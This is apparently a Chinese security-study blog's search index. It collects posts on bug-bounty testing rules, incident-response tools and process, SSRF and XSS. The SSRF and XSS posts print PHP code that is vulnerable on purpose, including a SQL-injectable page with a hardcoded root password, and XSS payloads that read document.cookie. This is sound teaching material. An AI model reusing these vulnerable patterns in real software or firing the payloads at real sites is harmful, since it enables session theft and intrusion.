<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[渗透测试之规范学习]]></title>
    <url>%2F2020%2F03%2F08%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SRC行业安全测试规范​ 公告编号：CNSRC-2019-0115 日期：2019-11-08 12:06:21 参与此标准制定的组织：菜鸟SRC、蚂蚁金服SRC、ASRC、阿里云先知、本地生活SRC、同舟共测-企业安全响应联盟、腾讯SRC、百度SRC、360SRC、小米SRC、滴滴SRC、苏宁SRC、唯品会SRC、微博SRC、美丽联合SRC、网易SRC、VIPKIDSRC、vivoSRC、WiFi万能钥匙SRC、完美世界SRC、爱奇艺SRC 学习目标：相关安全法规（统一规范，知道利弊，小心进去），总结学习安全相关法律法规的心得，在挖 SRC 漏洞之前要先阅读其发布的安全规范，以免踩坑。 一、测试规范: 注入漏洞，只要证明可以读取数据就行，严禁读取表内数据。对于UPDATE、DELETE、INSERT 等注入类型，不允许使用自动化工具进行测试。 越权漏洞，越权读取的时候，能读取到的真实数据不超过5组，严禁进行批量读取。 帐号可注册的情况下，只允许用自己的2个帐号验证漏洞效果，不要涉及线上正常用户的帐号，越权增删改，请使用自己测帐号进行。帐号不可注册的情况下，如果获取到该系统的账密并验证成功，如需进一步安全测试，请咨询管理员得到同意后进行测试。 存储xss漏洞，正确的方法是插入不影响他人的测试payload，严禁弹窗，推荐使用console.log，再通过自己的另一个帐号进行验证，提供截图证明。对于盲打类xss，仅允许外带domain信息。所有xss测试，测试之后需删除插入数据，如不能删除，请在漏洞报告中备注插入点。 如果可以shell或者命令执行的，推荐上传一个文本证明，如纯文本的1.php、1.jsp等证明问题存在即可，禁止下载和读取服务器上任何源代码文件和敏感文件，不要执行删除、写入命令，如果是上传的webshell，请写明shell文件地址和连接口令。 在测试未限制发送短信或邮件次数等扫号类漏洞，测试成功的数量不超过50个。如果用户可以感知，例如会给用户发送登陆提醒短信，则不允许对他人真实手机号进行测试。 如需要进行具有自动传播和扩散能力漏洞的测试（如社交蠕虫的测试），只允许使用和其他账号隔离的小号进行测试。不要使用有社交关系的账号，防止蠕虫扩散。 禁止对网站后台和部分私密项目使用扫描器。 除特别获准的情况下，严禁与漏洞无关的社工，严禁进行内网渗透。 禁止进行可能引起业务异常运行的测试，例如：IIS的拒绝服务等可导致拒绝服务的漏洞测试以及DDOS攻击。 请不要对未授权厂商、未分配给自己的项目、超出测试范围的列表进行漏洞挖掘，可与管理员联系确认是否属于资产范围后进行挖掘，否则未授权的法律风险将由漏洞挖掘者自己承担。 禁止拖库、随意大量增删改他人信息，禁止可对服务稳定性造成影响的扫描、使用将漏洞进行黑灰产行为等恶意行为。 敏感信息的泄漏会对用户、厂商及上报者都产生较大风险，禁止保存和传播和业务相关的敏感数据，包括但不限于业务服务器以及Github 等平台泄露的源代码、运营数据、用户资料等，若存在不知情的下载行为，需及时说明和删除。 尊重《中华人民共和国网络安全法》的相关规定。禁止一切以漏洞测试为借口，利用安全漏洞进行破坏、损害用户利益的行为，包括但不限于威胁、恐吓SRC要公开漏洞或数据，请不要在任何情况下泄露漏洞测试过程中所获知的任何信息，漏洞信息对第三方披露请先联系SRC获得授权。企业将对违法违规者保留采取进一步法律行动的权利。 二、学习心得:在挖 SRC 漏洞之前要先阅读其发布的安全规范，以免踩坑。在可以使用sqlmap执行查询动作的工具，只要对数据无影响，不得查询超过5组的数据，不得影响正常业务，对用户使用产生影响，xss插入测试之后需要删除测试数据，短信炸弹最多发送不超过50条，禁止社工，内网渗透，DDOS攻击，超出范围的测试。 参考链接：https://sec.cainiao.com/announce_conment.htm?id=115]]></content>
  </entry>
  <entry>
    <title><![CDATA[应急响应工具包]]></title>
    <url>%2F2020%2F02%2F25%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E5%8C%85%2F</url>
    <content type="text"><![CDATA[目标：1、掌握 Windows、Linux 系统及常见站点下快速收集信息（系统、用户、进程、安全日志等）及安全隐患排查的方法与技巧； 2、熟练使用火融剑/Process Explorer、Wireshark、rootkit 等进程、流量分析及木马查杀工具； 3、熟知各种常见的勒索病毒、木马查杀、在线样本分析站点； 4、将自己常用的应急响应工具整理成一个镜像包，并将相关工具的使用心得整理成文档。 扩展学习：系统安全漏洞排查（SQL注入、命令执行）、流量中对文件进行还原、虚拟机下对恶意程序进行动态分析。 信息收集基础信息收集windows 主机1.查看系统版本 (Windows NT是一系列操作系统的总称)ver 按下Windows 键+ R 键，打开【运行】对话框，输入【winver】，确定 2.查看 SP 版本wmic os get ServicePackMajorVersion (service packet (sp) 服务补丁包（一系列补丁的集合）) 3.查看 Hotfix （wmic qfe 查看补丁安装情况）hotfix—-热补丁针对单一漏洞的补丁 wmic qfe get hotfixid,InstalledOn 4.查看主机名hostname 5.查看网络配置ipconfig /all 6.查看路由表route print 7.查看开放端口netstat -ano 8.查看开启的服务net start 9.主机信息systeminfo 扩展 查看开放端口3389端口号对应的进程，最右边的数字就是进程号。netstat -ano | find “:3389” 2. tasklist -V | find “1276” 查找pid号1276的进程名称(-v 显示的更详细) 可以看出，是 xxx.exe 这个进程占用了端口号，这时可以使用 Windows 任务管理器将服务停掉。 3. taskkill /PID 17284 /T /F 强行终止一个进程 错误：权限无法访问解决方法：右击cmd,用管理员身份运行 taskkill /PID 1276 /T /F linux 主机1. 查看系统内核版本的两种方法 2. 3.lsb_release -a，即可列出所有版本信息 4.查看本地监听的tcp端口netstat -lnt 主机进程查看Windowstasklist命令1.查看本机进程 2.查看系统进程提供的服务 3 查看调用DLL模块文件的进程列表 tasklist /m 4.使用筛选器查找指定的进程 TASKLIST /FI “USERNAME ne NT AUTHORITY\SYSTEM” /FI “STATUS eq running” 列出了系统中正在运行的非“SYSTEM“状态的所有进程。其中“/FI“为筛选器参数。 Tasklist /FI “PID eq xxxx”，使用筛选器查找指定的PID 扩展1.windows 登录可使用 cmd 开启任务管理器： taskmgr 2.应急时如果是 windows xp 或 windows 7，任务管理器点“查看”－》“选择列” ，一般至少勾选“PID”和“映象路径”，可以选择多个列辅助应急。 Linux主机ps -aux 或 ps -ef1.显示所有包含其他使用者的进程,使用grep对进程进行筛选 ps -aux或者ps -ef 进程工具Windows: IceSword， wsyscheck， powertooWindows进程与端口对应情况1.使用 netstat –ano 命令得到端口对应的 PID，使用 Tasklist /FI “PID eq xxxx”命令得到 PID 对应的进程名称。 2.使用netstat -anb，可以直接查看进程与端口的对应情况 Linux进程与端口对应情况1.使用netstat -anp命令，可以查看端口对应的进程信息 2.使用lsof -i命令，可以查看实时的进程，服务与端口信息 常见的应用程序配置文件 wireshark流量中对文件进行还原应急响应工具使用windows进程分析工具ProcessHacker功能：ProcessHacker是一款不错的进程分析工具，可查看所有进程信息，包括进程加载的dll、进程打开的文件、进程读写的注册表……，也可以将特定进程的内存空间Dump到本地，此外还可以查看网络连接。 ProcessExplorer功能：ProcessExplorer是一款不错的进程分析工具，微软官方推荐工具，稳定性和兼容性相对不错。可查看所有进程的信息，包括其加载的dll、创建的线程、网络连接……，同样可以Dump出进程的内存空间到本地。 ProcessMonitor功能：ProcessMonitor是一款实时刷新的进程信息监控工具，微软官方推荐工具，稳定性和兼容性也是相对出色。展示的信息很全面，且每一个打开的句柄、注册表、网络连接……都与具体的进程关联起来。 windows启动项分析工具功能：一款不错的启动项分析工具，微软官方推荐。只要涉及到启动项相关的信息，事无巨细，通通都可以查询得到，非常方便找到病毒的启动项。 信息收集工具BrowsingHistoryView功能：收集浏览器的历史记录，方便追溯域名、URL的访问来源是否源自于用户行为。 WEB shell查杀工具 D盾 功能：D盾是迪元素科技的一款Webshell查杀工具。 相关学习网站勒索病毒(https://www.nomoreransom.org/)、木马查杀、在线样本分析站点信息查询网站勒索病毒信息查询网站：https://www.botfrei.de/de/ransomware/galerie.html 勒索病毒信息查询网站：https://id-ransomware.malwarehunterteam.com/ 解密工具卡巴斯基勒索病毒解密工具集：https://noransom.kaspersky.com/ Avast勒索软件解密工具集：https://www.avast.com/zh-cn/ransomware-decryption-tools Trendmicro勒索软件解密工具集：http://support.asiainfo-sec.com/Anti-Virus/Clean-Tool/Tools/RansomwareFileDecryptor/ nomoreransom勒索软件解密工具集：https://www.nomoreransom.org/zh/decryption-tools.html Emsisoft勒索软件解密工具集：https://www.emsisoft.com/decrypter/ 清除勒索软件以及下载免费解密工具。由卡巴斯基实验室发布。 https://noransom.kaspersky.com/zh/ 学习网站https://www.secpulse.com/archives/category/articles/system https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=32&amp;filter=typeid&amp;typeid=62&amp;orderby=dateline 2.1 病毒分析PCHunter：http://www.xuetr.com 火绒剑：https://www.huorong.cn Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker：https://processhacker.sourceforge.io/downloads.php autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL：https://www.bleepingcomputer.com/download/otl/ SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector 2.2 病毒查杀卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库） 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库） 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html 2.3 病毒动态CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn 微步在线威胁情报社区：https://x.threatbook.cn 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html 爱毒霸社区：http://bbs.duba.net 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html 2.4 在线病毒扫描网站http://www.virscan.org //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎 https://habo.qq.com //腾讯哈勃分析系统 https://virusscan.jotti.org //Jotti恶意软件扫描系统 http://www.scanvir.com //针对计算机病毒、手机病毒、可疑文件等进行检测分析 2.5 webshell查杀D盾_Web查杀：http://www.d99net.net/index.asp 河马webshell查杀：http://www.shellpub.com 深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html Safe3：http://www.uusec.com/webshell.zip 参考链接https://www.twblogs.net/a/5d0096fcbd9eee14029fbf7d/zh-cn https://www.freebuf.com/articles/es/206199.html 应急响应实战笔记-Bypass]]></content>
  </entry>
  <entry>
    <title><![CDATA[应急响应基础]]></title>
    <url>%2F2020%2F02%2F24%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[目标1、掌握应急响应的概念及常规的响应场景； 2、了解 PDCERF 流程，每个阶段要做的具体事情并绘制出流程图； 3、熟悉应急响应中常见的安全事件分类； 4、将学习心得与绘制的流程图整理成文档。 扩展学习：企业应急事件分类、安全事件溯源分析的方法、卡巴斯基的应急响应指南。 基本概念安全事件（Security Accident） 是指影响一个系统正常工作的情况。这里的系统包括主机和网络，如黑客入侵、信息窃取、拒绝服务攻击、网络流量异常等 应急响应（Emergency Response） 是指组织为了应对突发/重大信息安全事件的发生所做的准备以及在事件发生后所采取的措施。 常规的应急响应场景（分类）网络攻击事件 安全扫描攻击：利用扫描器对目标进行扫描探测，发现漏洞后进一步利用漏洞进行攻击。 暴力破解攻击：对目标系统账号密码进行暴力破解，获得后台管理员权限。 系统漏洞攻击：操作系统，应用系统中存在的漏洞进行攻击。 WEB漏洞攻击：通过SQL注入，上传，XSS，授权绕过等WEB漏洞进行攻击。 拒绝服务攻击：通过大流量DDOS或者CC攻击目标，使服务器无法提供正常服务； 其他网络攻击行为。 恶意程序事件： 病毒，蠕虫，造成系统缓慢，数据损坏，运行异常； 远控木马： 主机被黑客远程控制； 僵尸网络程序（肉鸡行为）：主机对外发动DDOS攻击，对外发起扫描攻击行为； 挖矿程序 ：造成系统资源大量消耗； WEB恶意代码 Webshell后门：黑客通过Webshell控制主机； 网页挂马：页面被植入待病毒内容，影响访问者安全； 网页暗链：网站被植入博彩，游戏等广告内容。 信息破坏事件 系统配置遭篡改：系统中出现异常服务，进程，启动项，账号等等； 数据库内容篡改：业务数据遭到恶意篡改，引发业务异常和损失； 网站内容篡改：网站页面内容被黑客恶意篡改； 信息数据泄露事件：服务器数据，会员账号遭到窃取并泄露； 其他安全事件 账号被异常登录：系统账号在异地登录，可能出现账号密码泄露； 异常网络连接：服务器发起对外的异常访问，连接到木马主控端，矿池，病毒服务器等行为； 应急响应PDCERF 模型 P：指preparation准备，之前要做的各种工具，如编译好的Ls，ifconfig,ps这些事先准备好的。 D：指Detection诊断，诊断初期发生了哪些类型的问题，该环节强化了信息取证和预先通告，以助于后续工作的开展，利于同样是大规模流量，L4DDos和CC，蠕虫爆发，应对的应急手段不一样。 C:指Containment抑制，容易被忽视，首先应抑制受害范围，隔离区域，切断受害面扩大范围，再追求根治。思路同ITIL。 E：指Eradication根除，寻找根因，封堵攻击源。 R: 指Reconvery恢复，恢复业务，增加必要的安全加固措施，这步是大多说人熟悉的一步。 F：指follow-up跟踪，后续监控有无异常，报告，管理环节的自省和改进，现在一般称为安全运营的持续改进环节。 具体要做的事情如下: 准备阶段 该阶段以预防为主。 （1）制定应急响应工作流程文档计划，建立一组基于威胁态势的合理防御措施。 （2）制定预警与报警的方式流程，建立搞笑事件处理程序； （3）建立备份的体系和流程，按网络安全政策配置安全设备和软件； （4）一个支持事件响应活动的基础设施，获取处理问题的资源和人员，进行安全培训，预演应急事件； 事件监测与分析阶段a.紧急事件监测，如何检测？： 防火墙日志 系统日志 Web服务器日志 IDS日志 可疑的用户 管理员报告 b.初始响应： 初步判定事件类型，定义事件级别，预估事件的范围和影响严重程度（涉及到多少网络，多少主机等）以此决定启动相应的应急响应方案； 准备相关资源； 为紧急事件的处理取得管理方面的支持（决定是否关闭被破坏系统的业务，是否继续收集入侵者活动数据）； 组件事件处理小组； 制定安全事件响应策略； c.事件分级： 决定什么对自己最重要 为紧急事件确定优先级，更有效的利用资源 不是紧急事件都需要平等对待； d.响应后的事件调查 事件起因分析 事件取证追查 系统后门调查，漏洞分析 数据收集，数据分析； 抑制处理阶段在检测到安全事件后，抑制的目的在于限制攻击范围，限制潜在的损失与破坏，在限制被抑制后，找出事件根源并彻底解决；然后就该着手恢复系统，把所有受侵害的系统，应用数据库恢复到他们的正常业务状态。 收集入侵相关的所有资料，收集并保护证据，保证安全地获取并且保存证据； 确定使系统恢复正常的需求和时间表、从可信的备份介质中恢复用户数据和应用服务； 通过对有关恶意代码或行为的分析结果，找出事件根源明确相应的补救措施并彻底清除，并对攻击源进行准确定位并采取措施将其中断； 清理系统、恢复数据、程序、服务，把所有被攻破的系统和网络设备彻底还原到正常的任务状态。 应急响应基本流程 应急响应的目标· 防止散乱和无协作的响应 · 根据法律和政策保护隐私 · 确认或排除事件是否发生 · 进行快速检查和现场封锁 · 将事件的破坏性减到最小 · 提供报告和有价值的建议 · 改进策略防止类似事件发生 参考文档https://www.jianshu.com/p/e49f0319044c]]></content>
  </entry>
  <entry>
    <title><![CDATA[SSRF相关]]></title>
    <url>%2F2019%2F12%2F17%2FSSRF%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[什么是SSRF?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 形成原因漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 易产生SSRF的地方 分享：通过url地址分享网页内容 通过url地址加载或者下载图片 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 其他调用url或者类似出现==站内站==的情况，能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程 URL 上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如 mongodb 的 copyDatabase 函数。 邮件系统就是接收邮件服务器地址这些地方。 文件就找 ImageMagick，xml 这些。 从 URL 关键字中寻找，比如：source,share,link,src,imageurl,target 等。 php后端实现1、file_get_contents 12345678910&lt;?phpif (isset($_POST[&apos;url&apos;])) &#123; $content = file_get_contents($_POST[&apos;url&apos;]); $filename =&apos;./images/&apos;.rand().&apos;;img1.jpg&apos;; file_put_contents($filename, $content); echo $_POST[&apos;url&apos;]; $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; &#125;echo $img;?&gt; 这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。 2、fsockopen() 1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&apos;&apos;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; 这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。 3、curl_exec() 123456789101112131415&lt;?php if (isset($_POST[&apos;url&apos;])) &#123; $link = $_POST[&apos;url&apos;]; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = &apos;./curled/&apos;.rand().&apos;.txt&apos;; file_put_contents($filename, $result); echo $result;&#125;?&gt; 使用 curl 获取数据。 SSRF利用 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 攻击运行在内网或本地的应用程序（比如溢出） 对内网 WEB 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli，redis等） 利用 file 协议读取本地文件等 其中file,dict,gopher协议常用。 1. 利用 file 协议读取本地文件此处应有实验 2. 利用dict协议探测端口此处应有实验 3. 利用gopher协议Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面 此处应有实验 稍复杂一点的情况利用gopher攻击内网中的一些有漏洞的应用等，如长亭文章中所说，利用gopher协议攻击redis应用。主要攻击 redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用 防御手段 限制协议为 HTTP、HTTPS，需求不需要，就不要开类似gopher，file，ftp协议 禁止 30x 跳转 设置 URL 白名单或者限制内网 IP 服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用 参考链接：http://v0w.top/2018/11/23/SSRF-notes/]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS相关]]></title>
    <url>%2F2019%2F12%2F16%2FXSS%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[什么是XSS?Cross Site Scripting，跨站脚本攻击,为了和层叠样式表（Cascading Style Sheet，CSS）区分，在WEB安全叫XSS。 简述：XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 成因通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。 危害攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致 XSS 。 网络钓鱼，包括获取各类用户账号； 窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 易产生XSS的地方 数据交互的地方 get、post、cookies、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 数据输出的地方 用户资料 关键词、标签、说明 文件上传 分类1、反射型Reflected XSS Attacks 反射型 XSS 攻击，有些地方也称为非持续性 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。因为 payload 在触发时，是客户端渲染了服务器响应体，payload 经过了服务器，是与服务器产生了交互了的。 常见注入点网站的搜索栏、用户登录入口、输入表单等地方。 攻击方式反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 alert(document.cookie) 漏洞复现构造反射型web界面 12345678910111213141516&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;hr&gt; &lt;?php $xss = @$_GET[&apos;xss_input&apos;]; echo &quot;your input:&quot;.$xss.&quot;\n&quot;; ?&gt;&lt;/body&gt;&lt;/html&gt; POC:alert(document.cookie) 看一下源码，发现XSS语句已经嵌入到html中。 2、存储型Stored XSS Attacks 持久型XSS，比反射型XSS更具有威胁性，并且可能影响到Web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。 常见注入点论坛、博客、留言板、网站的留言、评论、日志等交互处。 攻击方式攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 漏洞复现构造存储型XSS WEB界面 向后台数据库中存入POC save_xss.php 123456789101112131415161718192021222324252627&lt;html&gt;&lt;!--此网页用于向数据库中存入poc--&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;存储型XSS重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;id&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot; value=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; &lt;hr&gt;&lt;!--分割线--&gt; &lt;?php $id = @$_GET[&apos;id&apos;]; $xss = @$_GET[&apos;xss_input&apos;]; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;); mysql_select_db(&quot;users&quot;); if($xss !== null)&#123; $sql = &quot;insert into xss(id,text)values(&apos;$id&apos;,&apos;$xss&apos;)&quot;; $result = mysql_query($sql); echo $result; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; save_xss2.php 显示数据中的内容 12345678910111213141516171819&lt;html&gt;&lt;!--此网页用于展示数据库中的所有数据--&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;存储型XSS重现2&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;); mysql_select_db(&quot;users&quot;); $sql = &quot;select id,text from xss&quot;; $result = mysql_query($sql); while(@$row=mysql_fetch_array($result))&#123; echo $row[&apos;id&apos;].&quot;:&quot;.$row[&apos;text&apos;].&quot;&lt;/br&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 前端访问： 插入前端html 中 3、DOM型DOM(Document object model)，使用 DOM 能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互。 注入点通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。 攻击方式用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞 漏洞复现xss_dom.php 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;DOM型XSS重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt;&lt;!--js脚本--&gt; function test()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;testLink&lt;/a&gt;&quot;; &#125; &lt;/script&gt; &lt;div id=&quot;t&quot;&gt;&lt;/div&gt; &lt;input type=&quot;text&quot; id=&quot;text&quot; =&quot;text&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;url&quot; onclick=&quot;test()&quot; /&gt;&lt;/body&gt;&lt;/html&gt; POC:1&apos;&gt;&lt;img src=# onerror=&quot;alert(document.cookie)&quot;&gt;&lt;&apos; 1&apos; onclick=alert(document.cookie) // 闭合href标签，注释后面多余内容，从而在用户点击超链接时，触发XSS。 测试总结 XSS类型 反射型 存储型 DOM型 触发过程 正常用户访问携带XSS的url 1.黑客构造XSS脚本 2.用户访问有XSS脚本的网站 正常用户访问携带XSS的url 存储位置 url 数据库 url 谁来输出 后端web 后端web 前端JS 输出位置 HTML响应 HTML响应 动态生成的DOM节点 黑盒测试尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些： URL的每一个参数URL本身表单搜索框 常见业务场景重灾区：评论区、留言区、个人信息、订单信息等针对型：站内信、网页即时通讯、私信、意见反馈存在风险：搜索框、当前目录、图片属性等 XSS防御XSS的根本就是向网站插入脚本代码，并使它运行的一种手段。防御方法分为两种，服务端防御和客户端防御。 服务端防御：1、HttpOnly可以限制javascript不能读取cookie，防止会话ID泄露2、处理富文本过滤掉富文本中的敏感标签如（script、iframe、form），还有敏感词（javascript:） 等等 客户端防御：1、输入检查防止输入敏感字段，如javascript、cookie等等2、检查输出脚本都是通过混淆在HTML当中，被当成html代码的一部分才得到执行。可以通过编码转义的办法，使得混淆在其中的脚本被当成文本处理，不会被执行。编码转义的话，有三种方法： 1. HTML encode 将字符转换成HTMLEntities，一般会转（&amp;、&lt;、&gt;、”、’、/）这6个字符。一般是在html标签属性输出的时候使用2. JavaScriptEncode 使用”\“对特殊字符进行转义。 一般在script标签输出、事件输出、CSS输出3. URL Encode 使用URLEncode的方法。 参考链接：http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/ https://xz.aliyun.com/t/4067]]></content>
  </entry>
  <entry>
    <title><![CDATA[手工注入过程]]></title>
    <url>%2F2019%2F11%2F21%2F%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、手工测试之前搭建的不同注入环境，并记录 sql 语句，最终以获取 mysql 中的用户信息和当前表的信息为目标 2、思考通过注入漏洞可以做什么？ 3、思考注入漏洞如何防御？代码、服务器等角度 扩展学习：针对不同的注入漏洞，编写防御代码，具体如何防御自己决定，相关代码均记录在报告中，测试自己的防御代码是否可以绕过，并将过程进行记录 1 常规回显手工注入]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于ddos]]></title>
    <url>%2F2019%2F10%2F04%2F%E5%85%B3%E4%BA%8Eddos%2F</url>
